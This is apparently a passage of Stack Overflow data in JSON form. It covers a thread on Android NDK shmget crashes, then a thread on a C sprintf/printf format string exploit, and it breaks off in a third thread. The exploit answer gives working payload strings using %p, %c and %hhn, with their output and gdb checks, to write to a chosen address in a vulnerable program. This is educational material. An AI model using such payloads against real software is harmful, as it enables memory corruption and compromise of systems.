"accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1544645200, "post_id": 53749994, "comment_id": 94353851, "body": "IMHO, adding these wrappers to NDK libc was a mistake."}, {"owner": {"reputation": 8554, "user_id": 632035, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8ed69ad748c440a055502c1b213757e5?s=128&d=identicon&r=PG", "display_name": "Dan Albert", "link": "https://stackoverflow.com/users/632035/dan-albert"}, "reply_to_user": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1544649547, "post_id": 53749994, "comment_id": 94355655, "body": "The motivation for adding them was that there are projects out there that need shm.h to compile, but still run fine as long as you don&#39;t use those parts of the project. strace, as an example."}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1544652705, "post_id": 53749994, "comment_id": 94357093, "body": "hm.. do they sniff for ENOSYS? Or they have some compile-time switch that says that ifdef ANDROID, don&#39;t use shm?"}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1544691413, "post_id": 53749994, "comment_id": 94368417, "body": "Since the counter-intelligence of SO seems to knee-jerk delete answers that are not long enough, I will repeat this as a comment: <i>If you need <b>shmem</b> in your library, try this <a href=\"https://github.com/pelya/android-shmem\" rel=\"nofollow noreferrer\">project</a> on GitHub.</i> Disclaimer: I never tried to run this emulation on API 27, and I cannot tell if the specific emulation does resolve the requirements for your project."}, {"owner": {"reputation": 117, "user_id": 8294830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/417216669d8fd2601e9896c32e02f725?s=128&d=identicon&r=PG&f=1", "display_name": "Learner", "link": "https://stackoverflow.com/users/8294830/learner"}, "edited": false, "score": 0, "creation_date": 1544704135, "post_id": 53749994, "comment_id": 94375416, "body": "Thanks for your answers @DanAlbert &amp; Alex, Thanks for editing the question Shizhen. I&#39;m not sure what ENOSYS is and how can I look for it. Anyhow i&#39;ll try the project mentioned by Alex &amp; see if it works for our requirement. I just want to mention my disappointment with Android here as this is a bit misleading during the porting process and the version of shm header that I have doesn&#39;t mention that they are not supported. Thank you again for your time."}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 1, "creation_date": 1544738024, "post_id": 53749994, "comment_id": 94393102, "body": "I am afraid nobody will see the comments in shm.h as long as the file compiles. And even if it produces warnings, very few will notice."}, {"owner": {"reputation": 117, "user_id": 8294830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/417216669d8fd2601e9896c32e02f725?s=128&d=identicon&r=PG&f=1", "display_name": "Learner", "link": "https://stackoverflow.com/users/8294830/learner"}, "reply_to_user": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1544770039, "post_id": 53749994, "comment_id": 94400668, "body": "@AlexCohn yes Alex, I didn&#39;t bother about the file as long as the code compiled, but dug into it further after I was getting the crashes due to &#39;shmget&#39;. Thanks again for your time and answers."}, {"owner": {"reputation": 117, "user_id": 8294830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/417216669d8fd2601e9896c32e02f725?s=128&d=identicon&r=PG&f=1", "display_name": "Learner", "link": "https://stackoverflow.com/users/8294830/learner"}, "reply_to_user": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1544779265, "post_id": 53749994, "comment_id": 94404501, "body": "@AlexCohn, My project also uses other Sys V IPC features, like semaphores and message queues. Can any of you please suggest the alternatives for Sys V Semaphore APIs (semget(), semop() &amp; semctl()) and the Sys V message queue APIs (msgget(), msgsnd(), msgctl() &amp; msgget())."}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1544785141, "post_id": 53749994, "comment_id": 94407902, "body": "Maybe you need to reconsider your approach. In Android, there is no much sense in semaphores et al because each app runs in its own sandbox, separated by uid."}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1544798689, "post_id": 53749994, "comment_id": 94415044, "body": "Without knowing the context, it&#39;s hard to help you. But it&#39;s quite possible that all multi-process features are simply not relevant for the Android port."}, {"owner": {"reputation": 117, "user_id": 8294830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/417216669d8fd2601e9896c32e02f725?s=128&d=identicon&r=PG&f=1", "display_name": "Learner", "link": "https://stackoverflow.com/users/8294830/learner"}, "reply_to_user": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1544859013, "post_id": 53749994, "comment_id": 94431974, "body": "@AlexCohn, I&#39;ll try to explain briefly, our application to be ported uses lots of threads which uses Sys V IPC (&amp; we don&#39;t have a fork(), threads only, no new processes with fork()). As part of porting how can we achieve this IPC between the threads as currently Shared Memory, Semaphores &amp; Message Queues are all used. The project on Github solved Shared Memory though, how about the other two."}, {"owner": {"reputation": 117, "user_id": 8294830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/417216669d8fd2601e9896c32e02f725?s=128&d=identicon&r=PG&f=1", "display_name": "Learner", "link": "https://stackoverflow.com/users/8294830/learner"}, "reply_to_user": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 0, "creation_date": 1544871490, "post_id": 53749994, "comment_id": 94434352, "body": "@AlexCohn, I wasn&#39;t aware that Android supports POSIX IPC semaphores, as I tried to find the alternatives I found that POSIX semaphore APIs are provided by Android. This is a great news :) I&#39;m now using POSIX semaphore calls instead of unsupported Sys V IPC API&#39;s. Thanks for your time everyone..."}, {"owner": {"reputation": 52300, "user_id": 192373, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/83a45711c4c32eeeb3826d279e50f8ab?s=128&d=identicon&r=PG", "display_name": "Alex Cohn", "link": "https://stackoverflow.com/users/192373/alex-cohn"}, "edited": false, "score": 1, "creation_date": 1544872941, "post_id": 53749994, "comment_id": 94434663, "body": "If you only have one process, the sys V IPC APIs are an overkill, they may be leftovers from the times when pthread API was less popular.  You can emulate shmem, semaphores, and message queue for single process, to keep the core code as is."}, {"owner": {"reputation": 8554, "user_id": 632035, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8ed69ad748c440a055502c1b213757e5?s=128&d=identicon&r=PG", "display_name": "Dan Albert", "link": "https://stackoverflow.com/users/632035/dan-albert"}, "edited": false, "score": 0, "creation_date": 1545071682, "post_id": 53749994, "comment_id": 94490769, "body": "&quot;hm.. do they sniff for ENOSYS? Or they have some compile-time switch that says that ifdef ANDROID, don&#39;t use shm?&quot; The latter or neither, typically. Or they&#39;ll check something only semi-related like <code>EPOLL_CLOEXEC</code> for the existence of <code>epoll_create1</code>. Checking for <code>ENOSYS</code> would be the right approach, but people often won&#39;t fix problems that are only symptomatic for Android."}], "tags": [], "owner": {"reputation": 8554, "user_id": 632035, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/8ed69ad748c440a055502c1b213757e5?s=128&d=identicon&r=PG", "display_name": "Dan Albert", "link": "https://stackoverflow.com/users/632035/dan-albert"}, "is_accepted": true, "score": 2, "last_activity_date": 1544649355, "last_edit_date": 1544649355, "creation_date": 1544642547, "answer_id": 53749994, "question_id": 53746788, "link": "https://stackoverflow.com/questions/53746788/android-ndk-run-time-errors-when-using-shmget-shmctl-shmdt-in-android-api-27/53749994#53749994", "title": "Android-NDK: Run time errors when using shmget, shmctl, shmdt in Android API 27", "body": "<p>The syscall wrappers being available in libc is not the same as the kernel making those syscalls available. It would seem that those syscalls are not allowed, as they are not mentioned in <code>SYSCALLS.TXT</code> or <code>SECCOMP_WHITELIST_*.TXT</code>.</p>\n\n<p><a href=\"https://android.googlesource.com/platform/bionic/+/master/libc\" rel=\"nofollow noreferrer\">https://android.googlesource.com/platform/bionic/+/master/libc</a></p>\n\n<p>Did you check for errors from your syscalls? Presumably the first one failed with <code>ENOSYS</code>.</p>\n\n<p>EDIT:</p>\n\n<p>If you look at the most recent copy of this header the comments explain this: <a href=\"https://android.googlesource.com/platform/bionic/+/master/libc/include/sys/shm.h\" rel=\"nofollow noreferrer\">https://android.googlesource.com/platform/bionic/+/master/libc/include/sys/shm.h</a>. Those haven't made it into a released NDK yet though.</p>\n"}], "owner": {"reputation": 117, "user_id": 8294830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/417216669d8fd2601e9896c32e02f725?s=128&d=identicon&r=PG&f=1", "display_name": "Learner", "link": "https://stackoverflow.com/users/8294830/learner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 501, "favorite_count": 0, "accepted_answer_id": 53749994, "answer_count": 1, "score": 2, "last_activity_date": 1552576014, "creation_date": 1544630235, "last_edit_date": 1544664946, "question_id": 53746788, "link": "https://stackoverflow.com/questions/53746788/android-ndk-run-time-errors-when-using-shmget-shmctl-shmdt-in-android-api-27", "title": "Android-NDK: Run time errors when using shmget, shmctl, shmdt in Android API 27", "body": "<p>I need to port a native library which uses <strong>System V</strong> shared memory for IPC. There are calls to methods like <code>shmget()</code>, <code>shmctl()</code> &amp; <code>shmdt()</code>. I was able to compile the native code and build the native library, but when I run the library with the help of emulator, the application is crashing.</p>\n\n<p><em>Below is the line where it's crashing.</em></p>\n\n<blockquote>\n  <p><strong>iShmId = shmget( tKey, iSize, IPC_CREAT | IPC_EXCL | _DEF_ACCESS );</strong></p>\n</blockquote>\n\n<p>I'm using <strong>Android Studio</strong>, Android API level 27.</p>\n\n<p>I came across this link: <a href=\"https://stackoverflow.com/questions/38633713/how-to-use-shared-memory-in-android-native-code\">How to use shared memory in android native code?</a> where it's said that these API's are not supported, but I thought that the latest Android API level 27 might have support for the same.</p>\n\n<p>I verified the <code>ndk-bundle\\sysroot\\usr\\include\\sys\\shm.h</code> header and these API's are seem to be supported since API 26, below is the extract from <code>shm.h</code> file.</p>\n\n<pre><code>#if __ANDROID_API__ &gt;= 26\nvoid* shmat(int __shm_id, const void* __addr, int __flags) __INTRODUCED_IN(26);\nint shmctl(int __shm_id, int __cmd, struct shmid_ds* __buf) __INTRODUCED_IN(26);\nint shmdt(const void* __addr) __INTRODUCED_IN(26);\nint shmget(key_t __key, size_t __size, int __flags) __INTRODUCED_IN(26);\n\n#endif /* __ANDROID_API__ &gt;= 26 */\n</code></pre>\n\n<p>Can anyone please let me know what am I missing here. As I'm able to compile &amp; build the library, these API's should be supported. So, I should be missing something.</p>\n\n<p><em>Below is the error from Logcat:</em></p>\n\n<pre><code>2018-12-09 12:43:51.313 31453-31473/com.android.phone A/libc: Fatal signal 6 (SIGABRT), code -6 (SI_TKILL) in tid 31473 (HwBinder:31453_), pid 31453 (m.android.phone)\n2018-12-09 12:43:51.490 31529-31529/? A/DEBUG: backtrace:\n2018-12-09 12:43:51.490 31529-31529/? A/DEBUG:     #00 pc 00000b39  [vdso:e9577000] (__kernel_vsyscall+9)\n2018-12-09 12:43:51.490 31529-31529/? A/DEBUG:     #01 pc 0001fdf8  /system/lib/libc.so (syscall+40)\n2018-12-09 12:43:51.490 31529-31529/? A/DEBUG:     #02 pc 000321fe  /system/lib/libc.so (shmget+46)\n2018-12-09 12:43:51.491 31529-31529/? A/DEBUG:     #03 pc 00016b57  /data/app/com.example.****.app--7DjBy2wqavG-QlF-n6rDg==/lib/x86/libNativeLib.so\n2018-12-09 12:43:51.491 31529-31529/? A/DEBUG:     #04 pc 0001684f  /data/app/com.example.****.app--7DjBy2wqavG-QlF-n6rDg==/lib/x86/libNativeLib.so (GetShmSegment+447)\n2018-12-09 12:43:51.491 31529-31529/? A/DEBUG:     #05 pc 00014940  /data/app/com.example.****.app--7DjBy2wqavG-QlF-n6rDg==/lib/x86/libNativeLib.so\n2018-12-09 12:43:51.491 31529-31529/? A/DEBUG:     #06 pc 000148e7  /data/app/com.example.****.app--7DjBy2wqavG-QlF-n6rDg==/lib/x86/libNativeLib.so (GetCurrentProcessId+23)\n2018-12-09 12:43:51.491 31529-31529/? A/DEBUG:     #07 pc 0001b7cf  /data/app/com.example.****.app--7DjBy2wqavG-QlF-n6rDg==/lib/x86/libNativeLib.so (_init+207)\n2018-12-09 12:43:51.491 31529-31529/? A/DEBUG:     #08 pc 00023d68  /system/bin/linker (__dl__ZN6soinfo17call_constructorsEv+696)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #09 pc 00023b6a  /system/bin/linker (__dl__ZN6soinfo17call_constructorsEv+186)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #10 pc 0000c156  /system/bin/linker (__dl__Z9do_dlopenPKciPK17android_dlextinfoPKv+2102)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #11 pc 00007263  /system/bin/linker (__loader_android_dlopen_ext+83)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #12 pc 00000eb6  /system/lib/libdl.so (android_dlopen_ext+38)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #13 pc 00003998  /system/lib/libnativeloader.so (android::OpenNativeLibrary(_JNIEnv*, int, char const*, _jobject*, _jstring*, bool*, std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt;&gt;*)+424)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #14 pc 0031eb61  /system/lib/libart.so (art::JavaVMExt::LoadNativeLibrary(_JNIEnv*, std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt;&gt; const&amp;, _jobject*, std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt;&gt;*)+3009)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #15 pc 000036f6  /system/lib/libopenjdkjvm.so (JVM_NativeLoad+454)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #16 pc 00022d06  /system/lib/libopenjdk.so (Runtime_nativeLoad+38)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #17 pc 001149ba  /system/framework/x86/boot.oat (offset 0x114000) (java.lang.Runtime.nativeLoad [DEDUPED]+202)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #18 pc 005f0d52  /system/lib/libart.so (art_quick_invoke_static_stub+418)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #19 pc 000a30df  /system/lib/libart.so (art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+239)\n2018-12-09 12:43:51.492 31529-31529/? A/DEBUG:     #20 pc 0029bca2  /system/lib/libart.so (art::interpreter::ArtInterpreterToCompiledCodeBridge(art::Thread*, art::ArtMethod*, art::ShadowFrame*, unsigned short, art::JValue*)+338)\n</code></pre>\n"}, {"tags": ["c", "printf", "exploit"], "comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1544629915, "post_id": 53746514, "comment_id": 94345821, "body": "I&#39;m not seeing how that&#39;s supposed to produce a format string attack.  Such an attack ordinarily revolves around the program using user input as a <i>format string</i>.  Even if we suppose that <code>&quot;Hello %s!\\n&quot;</code> represents user input, such an attack also depends on the user-provided format string containing formatting directives that do not match the remaining actual arguments, which is not the case in your example."}, {"owner": {"reputation": 1375, "user_id": 1881719, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/f9d319fb5c2669d9bab860c9b2227505?s=128&d=identicon&r=PG", "display_name": "Wouter Vandenputte", "link": "https://stackoverflow.com/users/1881719/wouter-vandenputte"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1544629983, "post_id": 53746514, "comment_id": 94345872, "body": "@4386427 it shouldn&#39;t overflow the buffer. It should write to a specific address"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1544630099, "post_id": 53746514, "comment_id": 94345944, "body": "@4386427 It can overflow if <code>s</code> (+<code>&quot;Hello &quot;</code>) is longer than <code>buf</code>. But it is definitely not a format sting attack but a stack overflow."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544630187, "post_id": 53746514, "comment_id": 94346017, "body": "Moreover, a format string attack on one of the <code>printf</code>-family functions is most easily used to <i>extract</i> data, not modify it.  I really don&#39;t see at all how you expect to modify data at a particular address via anything like what you present."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1544630248, "post_id": 53746514, "comment_id": 94346071, "body": "@4386427 Right, with the specific input it won&#39;t. If it is terminated by <code>\\0</code> of course..."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1544630593, "post_id": 53746514, "comment_id": 94346286, "body": "@JohnBollinger A format string attack would use <b><code>%n</code></b> to write somewhere. That&#39;s how I rooted <code>&#47;usr&#47;bin&#47;screen</code> in my previous life..."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1544631066, "post_id": 53746514, "comment_id": 94346557, "body": "@AnttiHaapala Not necessarily. If the program has something like <code>printf(s)</code>, one can supply some crafted format string in <code>s</code>."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1544631135, "post_id": 53746514, "comment_id": 94346595, "body": "Actually it is the case here. <code>s</code> might contain some format specifiers. Then <code>printf(buf)</code> - where <code>buff</code> is a non-sanitized format string"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1544631359, "post_id": 53746514, "comment_id": 94346733, "body": "@4386427 Yes. <a href=\"https://ideone.com/1kPEU3\" rel=\"nofollow noreferrer\">ideone.com/1kPEU3</a>"}], "answers": [{"tags": [], "owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "is_accepted": false, "score": 1, "last_activity_date": 1544634699, "last_edit_date": 1544634699, "creation_date": 1544633813, "answer_id": 53747844, "question_id": 53746514, "link": "https://stackoverflow.com/questions/53746514/c-sprintf-exploit-formatting-attack/53747844#53747844", "title": "C sprintf exploit (formatting attack)", "body": "<p>You wouldn't exploit the <code>sprintf</code> to have a format string attack, but the later <code>printf</code> call.</p>\n\n<p>Exploiting this is rather easy if you can observe the output. Instead of going for exploit directly, you can craft a string with enough <code>%p</code> or <code>%x</code> until you see your desired bytes. For example this program works for me:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid greet(char *s) {\n   char buf[666];\n   sprintf(buf, \"Hello %s!\\n\", s);\n   printf(buf);\n}\n\nint main(void) {\n    greet(\"aaaaaa%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\"\n          \"%p%p%p%p%p%p%p%0#p\\x01\\x02\\x03\\x04\");\n}\n</code></pre>\n\n<p>I compile with <code>gcc -m32</code> and run, the output is</p>\n\n<pre><code>Hello aaaaaaaa0x566386f00x566386fc0x566385ac0xf7f4e5580x1\n0x10x566386fc0x6548d9a40x206f6c6c0x616161610x61616161\n0x702570250x702570250x702570250x702570250x70257025\n0x702570250x702570250x702570250x702570250x70257025\n0x702570250x702570250x4030201!\n</code></pre>\n\n<p>Now that we see the <code>0x04030201</code>, we can change the final <code>%0#p</code> to <code>%hhn</code> to write one <em>byte</em> to the address, or <code>%hn</code> for a <code>short</code>, or <code>%n</code> for <code>int</code>. This number is the count of characters written so far, converted to <code>char</code>, <code>short</code> or <code>int</code>. </p>\n\n<p>When we know where in stack the address is, we can change each <code>%p</code> to <code>%c</code> and we know that it is going to consume exactly one character, giving better control over the resulting number.</p>\n\n<p>We've got some slack with <code>a</code>s in the beginning - this can be used to change the precision of one of the conversions there to change the number of character written easily as desired (for example if the resulting number is <em>123</em> too low, it can be extended by printing one character with <em>124</em> character field width: <code>%124c</code>); the addition of count there can be offset by removing 3 a's from the prompt.</p>\n\n<p>Again this can be verified by using <code>%0#p</code>:</p>\n\n<pre><code>greet(\"aaa%123c%c%c%c%c%c%p%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%0#p\\x01\\x02\\x03\\x04\");\n</code></pre>\n\n<p>and we get:</p>\n\n<pre><code>Hello aaa                \n\n\ufffd\ufffd\ufffdX0x565e46fc\ufffdla1%%%%%%%%%%%%0x4030201!\n</code></pre>\n\n<p>Finally we just replace <code>%0#p</code> with <code>%hhn</code> and there be magic.</p>\n\n<p>To demonstrate that it really is writing to the address 0x04030201, you can use <a href=\"https://stackoverflow.com/questions/3003339/how-can-i-get-gdb-to-tell-me-what-address-caused-a-segfault\"><code>gdb</code> to find out the address that caused the violation</a>:</p>\n\n<pre><code>Program received signal SIGSEGV, Segmentation fault.\n0xf7e216aa in vfprintf () from /lib32/libc.so.6\n(gdb) p $_siginfo._sifields._sigfault.si_addr\n$1 = (void *) 0x4030201\n</code></pre>\n\n<p>And the rest is left as an exercise to the reader...</p>\n"}], "owner": {"reputation": 1375, "user_id": 1881719, "user_type": "registered", "accept_rate": 39, "profile_image": "https://www.gravatar.com/avatar/f9d319fb5c2669d9bab860c9b2227505?s=128&d=identicon&r=PG", "display_name": "Wouter Vandenputte", "link": "https://stackoverflow.com/users/1881719/wouter-vandenputte"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2504, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1544634699, "creation_date": 1544629252, "question_id": 53746514, "link": "https://stackoverflow.com/questions/53746514/c-sprintf-exploit-formatting-attack", "title": "C sprintf exploit (formatting attack)", "body": "<p>I want to write the integer 1 to the address 0x08049940 using the format string exploit (specifally the sprintf)</p>\n\n<p>this is how the function looks like </p>\n\n<pre><code>void greet(char *s) {\n   char buf[666];\n   sprintf(buf, \"Hello %s!\\n\", s);\n   printf(buf);\n}\n</code></pre>\n\n<p>I tried multiple tutorials but I believe they don't work because my string allready starts with \"Hello \". So I tried to start writing lower using the input</p>\n\n<blockquote>\n  <p>%.1%n\\x39\\x99\\x04\\x08</p>\n</blockquote>\n\n<p>which is 7 values lower, as well as other addresses in the neighbourhood of the original one. Yet my gdb debugger keeps telling me that the adress on 0x08049940 is still the default address specified in code.</p>\n"}, {"tags": ["c", "undefined-behavior", "bit-shift", "integer-promotion"], "comments": [{"owner": {"reputation": 97030, "user_id": 189205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c60305494593d556e57a3cf8e4a8c163?s=128&d=identicon&r=PG", "display_name": "interjay", "link": "https://stackoverflow.com/users/189205/interjay"}, "reply_to_user": {"reputation": 15373, "user_id": 822669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f66e2987d5d24e6d8a1f686154a51c21?s=128&d=identicon&r=PG", "display_name": "Sander De Dycker", "link": "https://stackoverflow.com/users/822669/sander-de-dycker"}, "edited": false, "score": 2, "creation_date": 1544628611, "post_id": 53746248, "comment_id": 94344975, "body": "@Sander I wouldn&#39;t call it a duplicate, because <code>short</code>s will be promoted to <code>int</code>s before shifting, which adds additional complexity here."}, {"owner": {"reputation": 15373, "user_id": 822669, "user_type": "registered", "profile_image": 